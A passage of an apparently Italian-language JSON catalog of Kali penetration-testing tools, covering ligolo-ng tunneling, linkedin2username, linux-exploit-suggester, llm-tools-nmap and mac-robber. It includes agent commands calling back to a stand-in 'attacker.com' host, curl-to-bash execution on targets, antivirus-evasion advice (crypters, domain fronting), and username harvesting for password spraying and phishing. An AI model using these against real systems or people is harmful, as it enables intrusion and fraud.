    "icon": "../app/icons/ligolo-ng-common-binaries-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ligolo-ng-common-binaries/",
    "desc": "Agent ligolo-ng precompilati per Windows, Linux e macOS pronti per il deploy.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Ligolo-ng Common Binaries è il pacchetto Kali che fornisce gli agent ligolo-ng precompilati per tutte le piattaforme supportate. Ligolo-ng è uno dei tool di tunneling più avanzati per penetration testing, permettendo di creare tunnel TLS crittografati e interfacce tun virtuali per un pivoting trasparente. Questo pacchetto elimina la necessità di compilare gli agent manualmente, fornendo binari pronti per Windows, Linux e macOS in varie architetture, essenziali per deployment rapido durante engagement con target eterogenei.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-Platform Coverage:</strong> Include agent precompilati per Windows (x86, x64), Linux (x86, x64, ARM, ARM64), e macOS (x64, ARM64/M1). Questa copertura permette di pivotare attraverso qualsiasi sistema operativo moderno senza ritardi di compilazione.</p><p><strong>Static Binaries:</strong> Gli agent Linux sono compilati staticamente, eliminando dipendenze da librerie dinamiche. Funzionano su qualsiasi distribuzione Linux indipendentemente dalla versione di glibc o altre librerie di sistema.</p><p><strong>Ready for Deployment:</strong> I binari sono organizzati per piattaforma e architettura con naming convention chiara (agent-windows-amd64.exe, agent-linux-arm64, etc.), permettendo di identificare e selezionare rapidamente l'agent corretto per ogni target.</p><p><strong>Synchronized Versions:</strong> Gli agent in questo pacchetto sono sempre sincronizzati con la versione del proxy ligolo-ng in Kali, garantendo compatibilità senza problemi di version mismatch.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>I binari sono installati in /usr/share/ligolo-ng/ e pronti per essere copiati e trasferiti sui target.</p><pre><code># Lista agent disponibili\nls -la /usr/share/ligolo-ng/\n\n# Copia agent per il target appropriato\ncp /usr/share/ligolo-ng/agent-windows-amd64.exe ./agent.exe\ncp /usr/share/ligolo-ng/agent-linux-amd64 ./agent\n\n# Transfer su target (esempio via SCP)\nscp agent user@target:/tmp/\n\n# Esecuzione su target Windows\nagent.exe -connect attacker.com:11601 -ignore-cert\n\n# Esecuzione su target Linux\nchmod +x agent && ./agent -connect attacker.com:11601 -ignore-cert\n\n# Con retry automatico in caso di disconnessione\n./agent -connect attacker:11601 -ignore-cert -retry</code></pre><p>L'opzione -ignore-cert è necessaria se il proxy usa certificati self-signed. Per ambienti di produzione, configurare certificati validi.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Durante <strong>Penetration Test</strong> con target multipli, avere agent precompilati permette di stabilire tunnel rapidamente senza perdere tempo in compilazione, specialmente quando si incontrano architetture diverse (server x64, IoT ARM, etc.).</p><p>Per <strong>Red Team Operations</strong> con accesso limitato alla rete, i binari possono essere pre-staged o trasferiti tramite canali alternativi (USB, phishing payload) e eseguiti immediatamente.</p><p>In scenari di <strong>Incident Response Simulation</strong>, la disponibilità immediata degli agent permette di testare rapidamente la detection capability dell'organizzazione contro tool di tunneling.</p><p>Per <strong>Lab e Training</strong>, non dover compilare ogni volta accelera significativamente l'apprendimento e la pratica delle tecniche di pivoting.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevamento:</strong> I binari precompilati distribuiti con Kali hanno hash noti e sono presenti nei database di signature di molti antivirus. Windows Defender e altri AV potrebbero bloccare l'esecuzione o generare alert.</p><p><strong>Impatto:</strong> L'agent stabilisce una connessione outbound verso il proxy, che può essere rilevata da firewall e sistemi di monitoring del traffico di rete.</p><p><strong>Mitigazioni:</strong> Per engagement dove la detection è critica, compilare agent custom con modifiche al codice sorgente o utilizzare packer/crypter. Considerare l'uso di porte comuni (443, 80) e domain fronting per mascherare il traffico. Verificare sempre le policy di engagement prima di deployare agent di tunneling.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "ligolo-ng-kali",
    "name": "ligolo-ng",
    "version": "0.8.2",
    "icon": "../app/icons/ligolo-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/ligolo-ng/",
    "desc": "Tunnel TCP/UDP con interfaccia TUN per pivoting completo senza proxy SOCKS.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Ligolo-ng</strong> è un tool di tunneling di nuova generazione che rivoluziona il pivoting in penetration testing creando vere interfacce TUN virtuali. A differenza dei tradizionali proxy SOCKS che richiedono di proxificare ogni tool, Ligolo-ng implementa routing layer 3 trasparente: una volta stabilito il tunnel e configurate le route, qualsiasi tool (Nmap, Metasploit, browser) funziona nativamente senza modifiche. L'architettura agent-proxy usa TLS per comunicazioni crittografate e supporta sia TCP che UDP completo, permettendo anche protocolli come DNS e NTP attraverso il tunnel.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>TUN Interface Architecture:</strong> Crea interfacce di rete virtuali layer 3 sul sistema attaccante. Tutto il traffico verso le subnet remote viene automaticamente incapsulato nel tunnel senza necessità di proxychains o configurazioni per-tool. Questo permette di usare scan completi, tool grafici, e qualsiasi protocollo.</p><p><strong>Full Protocol Support:</strong> Supporto completo per TCP e UDP attraverso il tunnel. Mentre la maggior parte dei tool di pivoting supporta solo TCP, Ligolo-ng permette di usare DNS, SNMP, NTP, e altri protocolli UDP-based su reti interne.</p><p><strong>Double/Multi Pivot:</strong> Supporta tunneling attraverso host multipli. Un agent su una rete può essere usato per raggiungere una seconda rete, che a sua volta può raggiungere una terza, permettendo di navigare attraverso architetture di rete segmentate.</p><p><strong>Listeners e Port Forwarding:</strong> Permette di esporre servizi locali dell'attaccante verso la rete target (reverse port forward) e di fare port forward da servizi interni verso la macchina attaccante.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Ligolo-ng richiede setup iniziale dell'interfaccia TUN e routing sul sistema attaccante.</p><pre><code># === SETUP INIZIALE (una volta) ===\n# Crea interfaccia TUN\nsudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up\n\n# === AVVIO PROXY ===\n# Avvia il proxy server con certificato self-signed\nligolo-proxy -selfcert\n# Proxy ascolta su porta 11601 di default\n\n# === ESECUZIONE AGENT SUL TARGET ===\n# Trasferisci agent su target e esegui\n./agent -connect attacker.com:11601 -ignore-cert\n# Con auto-retry\n./agent -connect attacker.com:11601 -ignore-cert -retry\n\n# === GESTIONE SESSIONI NEL PROXY ===\n# Lista sessioni connesse\nsession\n# Seleziona sessione (es. 1)\nsession 1\n# Mostra interfacce di rete del target\nifconfig\n# Avvia tunneling sulla sessione\nstart\n\n# === CONFIGURAZIONE ROUTING ===\n# Aggiungi route verso subnet interna\nsudo ip route add 10.10.10.0/24 dev ligolo\nsudo ip route add 172.16.0.0/16 dev ligolo\n\n# === PORT FORWARDING ===\n# Listener: esponi porta locale verso target\nlistener_add --addr 0.0.0.0:1234 --to 127.0.0.1:1234\n# Forward: porta interna verso attacker\nlistener_add --addr 0.0.0.0:8080 --to 192.168.1.100:80 --tcp</code></pre><p>Una volta configurate le route, qualsiasi tool funziona nativamente: nmap 10.10.10.0/24, firefox http://10.10.10.5/, etc.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Pivoting Completo</strong>, Ligolo-ng permette di accedere a intere subnet interne con tutti i tool disponibili. Nmap scan, Metasploit exploitation, accesso a servizi web interni - tutto funziona come se l'attaccante fosse fisicamente connesso alla rete target.</p><p>Durante <strong>Red Team Operations</strong>, la capacità di multi-pivot permette di navigare attraverso architetture di rete complesse: da DMZ a rete interna, da rete interna a VLAN di management, raggiungendo anche i segmenti più protetti.</p><p>Per <strong>Active Directory Attacks</strong>, il supporto UDP permette di eseguire attacchi Kerberos (AS-REP roasting, Kerberoasting) e DNS-based attacks attraverso il tunnel, cosa impossibile con proxy SOCKS tradizionali.</p><p>In scenari di <strong>Service Exploitation</strong>, i listener permettono di ricevere reverse shell da host interni o esporre servizi (come handler Metasploit) verso la rete target.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Network Detection:</strong> Il tunnel genera traffico TLS outbound dalla vittima verso l'attaccante su porta 11601 (o custom). Questo può essere rilevato da IDS/IPS e firewall. Considerare l'uso di porte comuni (443, 80) e domain fronting per evasione.</p><p><strong>Process Visibility:</strong> L'agent gira come processo separato sul sistema target. EDR e process monitoring possono rilevarlo. Il nome del processo può essere rinominato ma l'attività di rete rimane visibile.</p><p><strong>Traffic Volume:</strong> A differenza di strumenti più furtivi, il pivoting genera traffico proporzionale all'attività. Scan aggressivi attraverso il tunnel creano volumi significativi facilmente notabili nel monitoring.</p><p><strong>Mitigazioni:</strong> Usare certificati validi invece di self-signed, implementare sleep tra le operazioni, preferire query mirate invece di scan completi, e considerare l'uso di proxy intermedi per mascherare l'origine.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "linkedin2username",
    "name": "linkedin2username",
    "version": "0.29",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/linkedin2username/",
    "desc": "Genera liste di username da profili LinkedIn per password spraying e phishing.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>LinkedIn2Username</strong> è uno strumento OSINT Python che automatizza la generazione di liste di username aziendali estraendo informazioni sui dipendenti da LinkedIn. Partendo dal nome di un'azienda, enumera i profili dei dipendenti e trasforma i nomi in username potenzialmente validi secondo i pattern più comuni nelle organizzazioni (john.doe, jdoe, johnd, j.doe, etc.). Questo processo è fondamentale nella fase di reconnaissance pre-attacco per costruire liste di username da utilizzare in attacchi di password spraying contro portali di autenticazione aziendali.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>LinkedIn Employee Enumeration:</strong> Utilizzando le API di LinkedIn attraverso un account autenticato, enumera tutti i dipendenti associati a una specifica azienda. Supporta la paginazione per estrarre liste complete anche di grandi organizzazioni con migliaia di dipendenti.</p><p><strong>Multi-Format Username Generation:</strong> Genera username in tutti i formati comuni simultaneamente: first.last, flast, firstl, f.last, lastf, last.f, e altri pattern customizzabili. Ogni nome può produrre 10+ varianti, massimizzando la probabilità di trovare il formato corretto usato dall'organizzazione.</p><p><strong>Intelligent Name Handling:</strong> Gestisce correttamente nomi composti, cognomi con prefissi (van, de, von), caratteri speciali, e variazioni internazionali. Normalizza automaticamente caratteri accentati e gestisce casi edge come nomi multipli o iniziali.</p><p><strong>Department and Title Filtering:</strong> Permette di filtrare i risultati per dipartimento, titolo, o posizione geografica. Utile per targetizzare gruppi specifici (IT staff, executive, HR) che potrebbero avere accessi privilegiati o essere più vulnerabili a phishing.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>LinkedIn2Username richiede un account LinkedIn valido per autenticarsi. Usare account sacrificabile.</p><pre><code># === ENUMERAZIONE BASE ===\n# Enumera dipendenti e genera username\nlinkedin2username -u your@email.com -c \"Target Company Name\"\n# Inserire password quando richiesta\n\n# === FORMATI SPECIFICI ===\n# Solo formato first.last\nlinkedin2username -u email -c \"Company\" -f \"first.last\"\n\n# Formati multipli separati da virgola\nlinkedin2username -u email -c \"Company\" -f \"flast,first.last,firstl\"\n\n# Tutti i formati disponibili\nlinkedin2username -u email -c \"Company\" -f all\n\n# === OUTPUT E FILTRI ===\n# Salva su file\nlinkedin2username -u email -c \"Company\" -o usernames.txt\n\n# Filtra per keyword nel titolo\nlinkedin2username -u email -c \"Company\" --keyword \"IT\"\nlinkedin2username -u email -c \"Company\" --keyword \"Administrator\"\n\n# Limita numero di risultati\nlinkedin2username -u email -c \"Company\" -n 500\n\n# === OUTPUT AVANZATO ===\n# Include anche nome completo originale\nlinkedin2username -u email -c \"Company\" --include-names\n\n# Aggiungi dominio email\nlinkedin2username -u email -c \"Company\" -d targetcompany.com</code></pre><p>L'output può essere usato direttamente con tool come Spray, Ruler, o Burp Intruder per password spraying.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Password Spraying Attacks</strong>, la lista di username generata può essere usata contro portali di autenticazione (OWA, O365, VPN, Citrix) con password comuni come 'Season+Year' o 'Company+123'. Avere username validi è essenziale per evitare lockout e massimizzare le probabilità di successo.</p><p>In campagne di <strong>Spear Phishing</strong>, la conoscenza dei nomi completi e dei titoli permette di creare email altamente personalizzate e credibili. Le email che menzionano il nome del destinatario e il suo ruolo hanno tassi di successo significativamente maggiori.</p><p>Per <strong>Social Engineering</strong>, la mappa dell'organigramma aziendale permette di identificare relazioni gerarchiche da sfruttare: impersonare un manager per richiedere azioni urgenti a subordinati, o targetizzare assistenti esecutivi che spesso hanno accessi privilegiati.</p><p>Durante <strong>OSINT Assessment</strong>, la presenza e il numero di dipendenti su LinkedIn fornisce insight sulla struttura organizzativa, sedi, dipartimenti, e tecnologie usate (spesso menzionate nei profili dei tecnici).</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Account LinkedIn Risk:</strong> Lo scraping viola i ToS di LinkedIn. Account usati per enumeration estensiva vengono regolarmente bannati. Usare account dedicati/sacrificabili, mai account personali o di valore. I ban possono essere permanenti e estendersi a nuovi account dallo stesso IP.</p><p><strong>Rate Limiting:</strong> LinkedIn implementa rate limiting aggressivo. Query troppo rapide risultano in CAPTCHA, blocchi temporanei, o ban. Implementare delay appropriati tra le richieste e limitare le sessioni giornaliere.</p><p><strong>Nessun Contatto con Target:</strong> Aspetto OPSEC positivo - lo strumento non contatta direttamente l'organizzazione target. Tutte le query passano attraverso LinkedIn. L'azienda non ha visibilità sulle attività di enumeration.</p><p><strong>Attribution:</strong> L'account LinkedIn usato può essere tracciato. Non usare profili collegabili alla propria identità o organizzazione. Considerare l'uso di VPN/proxy per mascherare l'origine delle richieste.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "People_Search"
    ],
    "notes": null
  },
  {
    "id": "linux-exploit-suggester",
    "name": "linux-exploit-suggester",
    "version": "1.1",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/linux-exploit-suggester/",
    "desc": "Suggerisce exploit kernel Linux basandosi su versione e configurazione del sistema.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p>Linux Exploit Suggester è uno script Bash che automatizza l'identificazione di potenziali exploit kernel per privilege escalation su sistemi Linux. Analizza la versione del kernel in esecuzione, la configurazione del sistema, e i moduli caricati, confrontando queste informazioni con un database costantemente aggiornato di vulnerabilità kernel note (CVE). Per ogni vulnerabilità potenzialmente applicabile, fornisce una valutazione della probabilità di successo, dettagli tecnici, e link diretti a exploit pubblici e PoC. È uno strumento fondamentale nella fase di privilege escalation dopo aver ottenuto un accesso iniziale a basso privilegio.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Comprehensive Kernel Analysis:</strong> Estrae automaticamente tutte le informazioni rilevanti: versione kernel esatta, architettura, distribuzione, configurazioni di sicurezza attive (SMEP, SMAP, KASLR, SELinux), e moduli kernel caricati. Queste informazioni sono cruciali per determinare quali exploit sono effettivamente applicabili.</p><p><strong>CVE Database Matching:</strong> Mantiene un database interno di centinaia di vulnerabilità kernel Linux con metadati dettagliati: versioni affette, condizioni necessarie, affidabilità dell'exploit. Il matching considera non solo la versione ma anche le configurazioni che potrebbero bloccare l'exploit.</p><p><strong>Probability Assessment:</strong> Classifica ogni exploit suggerito con un livello di probabilità di successo (Highly Probable, Probable, Less Probable) basato su: match esatto della versione, presenza di condizioni necessarie, storia di affidabilità dell'exploit, e configurazioni di mitigazione attive.</p><p><strong>Actionable Output:</strong> Per ogni vulnerabilità identificata fornisce: CVE ID, descrizione della vulnerabilità, versioni kernel affette, link a exploit-db o GitHub con PoC funzionanti, e note su eventuali requisiti (compilatore, librerie) o limitazioni.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Lo script può essere eseguito direttamente sul target o fornendo manualmente le informazioni di sistema.</p><pre><code># === ESECUZIONE SUL TARGET ===\n# Download ed esecuzione diretta (se curl disponibile)\ncurl -sL https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash\n\n# Oppure copia lo script e esegui\nchmod +x linux-exploit-suggester.sh\n./linux-exploit-suggester.sh\n\n# === SPECIFICARE VERSIONE KERNEL ===\n# Utile per analisi offline o quando non si può eseguire lo script\n./linux-exploit-suggester.sh -k 4.15.0-20-generic\n./linux-exploit-suggester.sh --kernel 5.4.0-42-generic\n\n# === FILTRAGGIO OUTPUT ===\n# Solo exploit ad alta probabilità\n./linux-exploit-suggester.sh | grep -A5 \"Highly Probable\"\n\n# Solo vulnerabilità specifiche\n./linux-exploit-suggester.sh | grep -i \"dirty\"\n\n# === OUTPUT STRUTTURATO ===\n# Formato CSV per analisi\n./linux-exploit-suggester.sh --csv > kernel_vulns.csv\n\n# === ANALISI COMPLETA ===\n# Con tutte le informazioni di sistema\n./linux-exploit-suggester.sh -f  # full output\n./linux-exploit-suggester.sh --checksec  # include security features check</code></pre><p>L'output evidenzia gli exploit più probabili in cima alla lista, permettendo di prioritizzare i tentativi.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Privilege Escalation</strong> dopo aver ottenuto una shell a basso privilegio, Linux Exploit Suggester identifica rapidamente i vettori di escalation più promettenti. Invece di testare manualmente ogni exploit kernel noto, lo script filtra quelli applicabili alla versione specifica.</p><p>Durante <strong>CTF Competitions</strong>, dove il tempo è critico, fornisce un quick-win immediato: eseguire lo script, identificare l'exploit più probabile, scaricarlo, compilarlo ed eseguirlo può portare a root in pochi minuti su macchine vulnerabili.</p><p>Per <strong>Security Auditing</strong>, permette di verificare lo stato di patching dei kernel sui sistemi aziendali. L'output CSV può essere aggregato per identificare sistemi critici che richiedono aggiornamenti urgenti.</p><p>In <strong>Vulnerability Assessment</strong>, aiuta a documentare l'esposizione a vulnerabilità kernel note, fornendo CVE specifici e CVSS scores per i report di sicurezza.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Footprint Minimo:</strong> Lo script è puramente informativo - legge solo informazioni di sistema senza eseguire exploit o modificare nulla. Può essere eseguito da memoria con curl|bash senza lasciare file su disco.</p><p><strong>Rilevamento:</strong> L'esecuzione dello script può essere rilevata da EDR che monitorano l'accesso a /proc/version, uname syscalls, o pattern di comandi associati a reconnaissance. In ambienti hardened, preferire analisi offline.</p><p><strong>Compilazione Exploit:</strong> Gli exploit suggeriti spesso richiedono compilazione. GCC potrebbe non essere presente sul target. In questi casi, compilare sulla macchina attaccante per l'architettura target (cross-compile se necessario) e trasferire il binario.</p><p><strong>Stabilità Sistema:</strong> Alcuni exploit kernel possono causare kernel panic se falliscono. Valutare sempre l'impatto prima di eseguire exploit, specialmente su sistemi di produzione durante engagement autorizzati.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Linux"
    ],
    "notes": null
  },
  {
    "id": "llm-tools-nmap",
    "name": "llm-tools-nmap",
    "version": "0.0~git20250612.36818ca",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/llm-tools-nmap/",
    "desc": "Integrazione Nmap per LLM che permette a AI di eseguire e interpretare scan di rete.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>LLM-Tools-Nmap</strong> è un pacchetto di integrazione che permette a Large Language Models (come Claude, GPT, o modelli open-source) di eseguire scan Nmap e interpretarne i risultati in modo autonomo. Implementa un'interfaccia tool/function-calling che traduce richieste in linguaggio naturale in comandi Nmap appropriati, esegue gli scan, e restituisce risultati strutturati che l'AI può analizzare e commentare. Questo abilita workflow di penetration testing assistiti da AI dove l'operatore può chiedere in linguaggio naturale di scansionare target e ricevere analisi immediate dei risultati.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Natural Language Interface:</strong> L'AI interpreta richieste come \"scan for web servers on this subnet\" o \"check what services are running on this IP\" e le traduce automaticamente nei parametri Nmap appropriati, scegliendo tecniche di scan, porte, e opzioni di detection ottimali per l'obiettivo.</p><p><strong>Structured Result Parsing:</strong> L'output XML di Nmap viene processato e convertito in formato strutturato (JSON) che l'AI può analizzare efficacemente. Ogni host, porta, servizio, e versione è organizzato in modo che l'AI possa formulare insight e suggerimenti.</p><p><strong>Contextual Recommendations:</strong> Basandosi sui servizi scoperti, l'AI può suggerire azioni successive: vulnerability scan specifici, exploit potenziali, o ulteriori enumerazioni. Ad esempio, trovando SSH può suggerire bruteforce, trovando SMB può suggerire enum4linux.</p><p><strong>Scan Orchestration:</strong> Permette di concatenare scan multipli in sequenza logica: discovery iniziale, seguito da port scan dettagliato, poi service detection, tutto coordinato dall'AI in base ai risultati intermedi.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>L'integrazione viene configurata come tool MCP (Model Context Protocol) o function per l'LLM utilizzato.</p><pre><code># === CONFIGURAZIONE MCP ===\n# In claude_desktop_config.json o configurazione MCP\n{\n  \"mcpServers\": {\n    \"nmap\": {\n      \"command\": \"llm-tools-nmap\",\n      \"args\": [\"--allow-networks\", \"192.168.0.0/16,10.0.0.0/8\"]\n    }\n  }\n}\n\n# === ESEMPI DI RICHIESTE ALL'AI ===\n# L'utente può chiedere in linguaggio naturale:\n\n\"Scan 192.168.1.1 for open ports\"\n# -> Tradotto in: nmap -sS -T4 192.168.1.1\n\n\"Do a full service detection on 10.10.10.5\"\n# -> Tradotto in: nmap -sV -sC -p- 10.10.10.5\n\n\"Check for web services on the 10.10.10.0/24 network\"\n# -> Tradotto in: nmap -p80,443,8080,8443 10.10.10.0/24\n\n\"Run a stealthy scan on 192.168.1.100\"\n# -> Tradotto in: nmap -sS -T2 --max-retries 2 192.168.1.100\n\n# === L'AI RISPONDE CON ===\n# - Elenco host attivi\n# - Porte aperte e servizi identificati\n# - Versioni software rilevate\n# - Potenziali vulnerabilità note\n# - Suggerimenti per azioni successive</code></pre><p>L'AI gestisce la complessità di Nmap, permettendo anche a utenti non esperti di condurre scan efficaci.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>AI-Assisted Penetration Testing</strong>, un operatore può condurre reconnaissance completa conversando con l'AI. \"Scan this IP, what do you find? Now check if SMB is vulnerable.\" L'AI esegue i comandi appropriati e analizza risultati, accelerando significativamente la fase di discovery.</p><p>Nel <strong>Security Training</strong>, studenti possono imparare Nmap attraverso l'AI: chiedendo di spiegare perché ha scelto certi parametri, cosa significano i risultati, e quali sono le implicazioni di sicurezza di servizi esposti.</p><p>Per <strong>Automated Security Auditing</strong>, l'AI può seguire metodologie strutturate: \"Perform a comprehensive scan following PTES methodology on these targets\" e documentare automaticamente i finding.</p><p>In <strong>SOC Operations</strong>, analisti possono richiedere quick-check su IP sospetti: \"Scan this IP that appeared in our logs, is it a known scanner?\" ricevendo analisi immediate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Network Visibility:</strong> Gli scan Nmap generati sono identici a quelli manuali in termini di network footprint. IDS, firewall, e sistemi di monitoring vedranno normale traffico Nmap. Non c'è offuscamento aggiuntivo.</p><p><strong>AI Judgment:</strong> L'AI potrebbe suggerire scan aggressivi che l'operatore non intendeva. Sempre verificare i comandi proposti prima dell'esecuzione, specialmente in ambienti di produzione. Configurare whitelist di network per prevenire scan accidentali su target non autorizzati.</p><p><strong>Logging:</strong> Le richieste all'AI e i risultati potrebbero essere loggati dal provider LLM. Per engagement sensibili, usare modelli locali o verificare le policy di data retention del provider.</p><p><strong>Privilege:</strong> Molti scan Nmap richiedono privilegi root. Assicurarsi che il tool sia configurato con i permessi appropriati e in ambiente controllato.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Port_Scanning"
    ],
    "notes": null
  },
  {
    "id": "mac-robber",
    "name": "mac-robber",
    "version": "1.02",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/mac-robber/",
    "desc": "Estrae timestamp MAC (Modified, Accessed, Changed) da filesystem per timeline forense.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Mac-robber</strong> è uno strumento forense che estrae timestamp MAC (Modified, Accessed, Changed/Created) da tutti i file e directory di un filesystem. L'output è generato nel formato 'body file' di The Sleuth Kit, permettendo l'integrazione diretta con mactime per la creazione di timeline forensi dettagliate. Questo processo è fondamentale nell'analisi forense digitale per ricostruire cronologicamente le attività su un sistema: quando file sono stati creati, modificati, acceduti, permettendo di tracciare azioni di utenti o malware in ordine temporale.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Complete MAC Time Extraction:</strong> Estrae tutti e quattro i timestamp rilevanti: Modified (ultima modifica contenuto), Accessed (ultimo accesso), Changed (ultima modifica metadati su Unix), e Birth/Created (creazione originale dove supportato). Questo fornisce una visione completa dell'attività su ogni file.</p><p><strong>Recursive Directory Traversal:</strong> Analizza ricorsivamente intere strutture di directory, includendo subdirectory, link simbolici (con gestione dei loop), e file nascosti. Può processare filesystem completi in minuti.</p><p><strong>Body File Format:</strong> L'output segue il formato standardizzato body file di The Sleuth Kit: MD5|path|inode|mode|UID|GID|size|atime|mtime|ctime|crtime. Questo formato è universalmente riconosciuto dai tool forensi.</p><p><strong>Filesystem Agnostic:</strong> Funziona su qualsiasi filesystem montato: ext2/3/4, NTFS, FAT, HFS+, XFS, e altri. I timestamp sono estratti attraverso le chiamate di sistema standard, quindi funziona ovunque il filesystem sia montato correttamente.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Mac-robber è tipicamente usato insieme a mactime per generare timeline leggibili.</p><pre><code># === ESTRAZIONE BASE ===\n# Estrai MAC times da directory\nmac-robber /home/suspect > body.txt\n\n# Da filesystem root completo\nmac-robber / > full_body.txt\n\n# === CREAZIONE TIMELINE ===\n# Genera timeline ordinata cronologicamente\nmactime -b body.txt > timeline.txt\n\n# Timeline in formato dettagliato\nmactime -b body.txt -d > timeline_detailed.csv\n\n# === FILTRI TEMPORALI ===\n# Solo eventi in un range specifico\nmactime -b body.txt 2024-01-01..2024-01-31 > january_timeline.txt\n\n# Ultimi 7 giorni\nmactime -b body.txt -y > recent_timeline.txt\n\n# === ANALISI IMMAGINE DISCO ===\n# Monta immagine in read-only\nsudo mount -o ro,loop,noatime evidence.dd /mnt/evidence\n\n# Estrai timeline\nmac-robber /mnt/evidence > evidence_body.txt\nmactime -b evidence_body.txt > evidence_timeline.txt\n\n# Smonta preservando l'evidence\nsudo umount /mnt/evidence\n\n# === COMBINAZIONE CON ALTRI TOOL ===\n# Combina con fls per file cancellati\nfls -r -m / image.dd > fls_body.txt\ncat body.txt fls_body.txt > combined_body.txt\nmactime -b combined_body.txt > full_timeline.txt</code></pre><p>La timeline risultante mostra ogni evento (MACB) ordinato cronologicamente con path completo del file.</p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Digital Forensics</strong>, la timeline MAC è fondamentale per ricostruire la sequenza di eventi su un sistema compromesso. Permette di identificare quando un attaccante ha acceduto al sistema, quali file ha creato o modificato, e in quale ordine ha eseguito le sue azioni.</p><p>Durante <strong>Incident Response</strong>, una timeline rapida aiuta a determinare l'ambito della compromissione: quando è iniziata, quali sistemi sono stati toccati, e quali dati potrebbero essere stati esfiltrati. Questo guida le decisioni di contenimento.</p><p>Per <strong>Malware Analysis</strong>, i timestamp rivelano quando il malware è stato scaricato, installato, e quali file ha creato o modificato durante l'esecuzione. Questo aiuta a identificare meccanismi di persistenza e lateral movement.</p><p>In <strong>Legal Investigations</strong>, le timeline forensi sono evidence documentabile che può essere presentata in procedimenti legali, mostrando quando specifiche azioni sono state compiute su un sistema.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Non-Invasive:</strong> Mac-robber è uno strumento puramente read-only. Usa chiamate stat() che non modificano i timestamp di accesso se il filesystem è montato con noatime o in read-only mode.</p><p><strong>Evidence Preservation:</strong> SEMPRE montare immagini forensi e filesystem evidence in read-only mode (mount -o ro,noatime) per prevenire qualsiasi modifica accidentale che invaliderebbe l'evidence.</p><p><strong>Timestamp Reliability:</strong> I timestamp possono essere manipolati da attaccanti sofisticati (timestomping). Correlare sempre con altre fonti: log di sistema, log di rete, journal del filesystem se disponibile.</p><p><strong>Time Zone:</strong> I timestamp sono in UTC o local time a seconda della configurazione del sistema. Documentare sempre il timezone usato per evitare confusione nell'analisi.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Disk_Analysis"
    ],
    "notes": null
  },
  {
    "id": "macchanger",
    "name": "macchanger",
    "version": "1.7.0",
    "icon": "../app/icons/macchanger-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/macchanger/",
    "desc": "Modifica MAC address di interfacce di rete per anonimato e bypass filtri.",
